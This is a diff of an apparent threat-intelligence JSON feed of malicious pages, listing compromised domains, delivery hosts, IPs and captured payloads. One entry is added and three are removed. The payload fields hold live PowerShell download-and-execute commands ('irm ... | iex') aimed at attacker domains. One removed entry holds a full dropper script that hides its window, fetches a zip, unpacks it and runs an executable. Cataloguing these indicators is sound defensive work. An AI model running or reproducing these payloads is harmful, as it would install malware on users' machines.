@@ -1,5 +1,22 @@
 [
   {
+    "UrlDomain": "ustkanrdk.ru",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.236.136.63"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwg9lbgo0l4u0omlslp8xa75",
+    "ScannedAt": "2026-11-14T10:30:14.635000+00:00"
+  },
+  {
     "UrlDomain": "nmengineering.co.za",
     "DeliveryUrl": [
       "github.pw"
@@ -8375,69 +8392,5 @@
     ],
     "ReportId": "cmwalipbz006w0oml8w01xd4l",
     "ScannedAt": "2026-11-10T11:17:30.993000+00:00"
-  },
-  {
-    "UrlDomain": "vinayweb.tech",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer",
-      "makeverizyjar.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "217.21.87.66"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=e10ef8de19605c32100e813253d3d24e5d4bc2d679abf1a5&amp;_v=29905138",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://makeverizyjar.info/api.php?s=e24fc8572d6bb6b800cd73affdfe08d8a0982d40960c32b3&amp;_v=29905138",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/c136798060204bf6'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/c136798060204bf6"
-    ],
-    "ReportId": "cmwakuk2x003w0omlqpskj6p6",
-    "ScannedAt": "2026-11-10T10:58:44.442000+00:00"
-  },
-  {
-    "UrlDomain": "cambridgeeducare.com",
-    "DeliveryUrl": [
-      "cloudeccentric.cc",
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "151.106.124.146"
-    ],
-    "Related": [],
-    "Payload": "irm 'browse-nnccodes.beer/eeb2a4c9abf0c82b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/eeb2a4c9abf0c82b"
-    ],
-    "ReportId": "cmwaktkno00240omll6ytk474",
-    "ScannedAt": "2026-11-10T10:57:58.511000+00:00"
-  },
-  {
-    "UrlDomain": "fastlocksmith.ae",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "91.108.98.177"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwaksurb000c0omlqqpruwgo",
-    "ScannedAt": "2026-11-10T10:57:24.944000+00:00"
   }
 ]
